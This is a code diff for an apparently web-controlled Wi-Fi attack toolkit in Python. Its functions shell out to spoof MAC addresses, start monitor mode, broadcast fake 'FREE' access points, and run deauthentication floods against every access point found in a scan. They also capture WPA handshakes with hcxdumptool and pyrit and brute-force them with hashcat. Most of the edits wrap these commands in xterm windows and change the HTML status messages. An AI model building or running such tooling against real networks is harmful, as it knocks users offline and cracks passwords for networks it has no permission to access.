@@ -25,11 +25,16 @@ def model(cmd, arg):
 
 
 def change_mac():
+    if 'monitor' in get_iw_wlan_info():
+        msg = ("<h2><font color='red'><p>Fail !!!</p></font>"
+               f"{WLAN} interface mode <font color='red'>monitor</font>.<p>"
+               f"Change mode to <font color='green'>managed</font></p></h2>")
+        return msg
     cmd = [f"ifconfig {WLAN} down",
            f"ifconfig {WLAN} hw ether 00:11:22:33:44:55",
            f"ifconfig {WLAN} up"]
     [subprocess.call(i, shell=True) for i in cmd]
-    return "<h2><font color='green'>mac address changed</h2></font>"
+    return "<h2>mac address <font color='green'>changed</h2></font>"
 
 
 def change_power():
@@ -98,8 +103,8 @@ def set_airmon_check_kill():
 
 
 def set_airmon_mode_monitor():
-    result = model(cmd=f'airmon-ng start {WLAN}', arg='')
-    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+    model(cmd=f'airmon-ng start {WLAN}', arg='')
+    return "<h2><font color='red'>FINISH</font></h2>"
 
 
 def set_wlan_mode_monitor():
@@ -142,51 +147,51 @@ def set_del_mon_interface():
 
 
 def set_airodump():
-    result = model(cmd=f'airodump-ng {WLAN}mon', arg='')
+    result = model(cmd=f'xterm -e airodump-ng {WLAN}mon', arg='')
     return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
 
 
 def set_airbase_fake_ap():
     set_add_mon_type_monitor()
-    cmd = f"airbase-ng -a 44:E9:DD:27:D8:F6 -e FREE -c 10 -Z 4 {MON}"
+    cmd = f"xterm -e airbase-ng -a 44:E9:DD:27:D8:F6 -e FREE -c 10 -Z 4 {MON}"
     result = model(cmd=cmd, arg='')
     return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
 
 
 def set_mdk3_fake_ap():
     set_add_mon_type_monitor()
-    cmd = f"mdk3 {MON} b -v fake_ap -g -m"
-    # cmd = f"mdk3 {MON} b -n 'FREE WIFI' -g -t 00:1E:20:36:24:3C -m -c 11"
+    cmd = f"xterm -e mdk3 {MON} b -v fake_ap -g -m"
+    # cmd = f"xterm -e mdk3 {MON} b -n 'FREE WIFI' -g -t 00:1E:20:36:24:3C -m -c 11"
     result = model(cmd=cmd, arg='')
     return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
 
 
 def set_mdk3_deauthentication():
-    # cmd = f"mdk3 {WLAN} d -c 1"
-    cmd = f"mdk3 {WLAN} d"
-    result = model(cmd=cmd, arg='')
-    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+    # cmd = f"xterm -e mdk3 {WLAN} d -c 1"
+    cmd = f"xterm -e mdk3 {WLAN} d"
+    model(cmd=cmd, arg='')
+    return "<h2><font color='red'>FINISH</font></h2>"
 
 
 def set_aireplay_deauthentication():
     mac = get_iwlist_wlan_scan_mac()
-    # cmd = f"aireplay-ng -0 0 -D {WLAN}"
-    result = [model(cmd=f"aireplay-ng -0 5 -a {i} {WLAN}", arg='') for i in mac]
-    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+    # cmd = f"xterm -e aireplay-ng -0 0 -D {WLAN}"
+    [model(cmd=f"xterm -e aireplay-ng -0 5 -a {i} {WLAN}", arg='') for i in mac]
+    return "<h2><font color='red'>FINISH</font></h2>"
 
 
 def set_pyrit_striplive():
-    cmd = f'pyrit -r {WLAN} -o {DUMP} stripLive'
+    cmd = f'xterm -e pyrit -r {WLAN} -o {DUMP} stripLive'
     subprocess.run(cmd, shell=True)
-    return f"<h2><font color='black'><pre>|result|</pre></font></h2>"
+    return f"<h2><font color='red'>FINISH</font></h2>"
 
 
 def set_hcxdumptool():
-    cmd = f'{PATH} -i {WLAN} -w {DUMP}'
-    # cmd = f'hcxdumptool -i {WLAN} -o {DUMP} --enable_status=2'
-    # result = subprocess.call(cmd, shell=True)
+    cmd = f'xterm -e {PATH} -i {WLAN} -w {DUMP}'
+    # cmd = f'xterm -e hcxdumptool -i {WLAN} -o {DUMP} --enable_status=2'
+    # subprocess.call(cmd, shell=True)
     subprocess.run(cmd, shell=True)
-    return f"<h2><font color='black'><pre>|result|</pre></font></h2>"
+    return f"<h2><font color='red'>FINISH</font></h2>"
 
 
 def set_hcxpcapngtool():
@@ -209,10 +214,10 @@ def set_hcxpcapngtool():
 
 
 def set_hashcat():
-    # cmd = f"hashcat -m 22000 {HASH} /usr/share/dict/wordlist-probable.txt"
-    cmd = f"hashcat -m 22000 {HASH} -a 3 ?d?d?d?d?d?d?d?d"
+    # cmd = f"xterm -e hashcat -m 22000 {HASH} /usr/share/dict/wordlist-probable.txt"
+    cmd = f"xterm -e hashcat -m 22000 {HASH} -a 3 ?d?d?d?d?d?d?d?d"
     subprocess.run(cmd, shell=True)
-    return 'result'
+    return f"<h2><font color='red'>FINISH</font></h2>"
 
 
 def get_mac_to_wpspin(mac: str) -> str:
@@ -308,7 +313,7 @@ def get_uptime() -> str:
         'uptime', shell=True).decode('utf-8').strip().split(' ')
     output = [i for i in sys.stdout]
     sys.stdout = stdout
-    html = f"<h3><font color='blue'>Current uptime is {output[0]}</font></h3>"
+    html = f"<h3>Current uptime is <font color='blue'>{output[0]}</font></h3>"
     return html
 
 
